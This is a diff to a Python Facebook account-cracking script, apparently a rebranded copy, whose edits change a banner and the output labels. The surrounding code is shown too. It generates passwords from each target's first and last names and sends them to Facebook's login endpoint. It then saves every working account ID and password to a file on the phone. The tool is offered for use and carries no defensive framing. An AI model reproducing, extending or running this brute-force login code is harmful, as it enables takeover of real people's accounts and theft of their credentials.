@@ -159,13 +159,7 @@ logo =f"""\x1b[1;97m
 \33[1;32m██║░╚██╗██║░░░██║░░░
 \33[1;32m╚═╝░░╚═╝╚═╝░░░╚═╝░░░
 
-
-                                   
-
-                                                      
-
-\033[1;36m["ENJOY HAKIR"]
-  
+ \033[1;36m["ENJOY HAKIR"]  
 ------------------------------------------------------------------------
 \33[1;36m ᴀᴜᴛʜᴏʀ    : KIT
 \33[1;36m ᴠᴇʀsɪᴏɴ    : 0.2
@@ -723,7 +717,7 @@ def ffb1(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [JARED-CRACKING-VIP] %s| \033[1;32mALIVE\033[0m║║\033[1;31mDEAD \033[1;32m%s\033[0m║║\033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [KIT-CRACKING-VIP] %s| \033[1;32mALIVE\033[0m | \033[1;31mDEAD \033[1;32m%s\033[0m | \033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
@@ -770,7 +764,7 @@ def ffb1(ids,names,passlist):
             url='https://graph.facebook.com/auth/login'
             req=requests.post(url,data=data,headers=headers).json()
             if 'session_key' in req:
-                print('\r\r\033[1;32m[ALIVE] '+ids+'|'+pas+'\n')
+                print('\r\r\033[1;32m[ALIVE] '+ids+'•'+pas+'\n')
                 open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                 oks.append(ids)
                 break
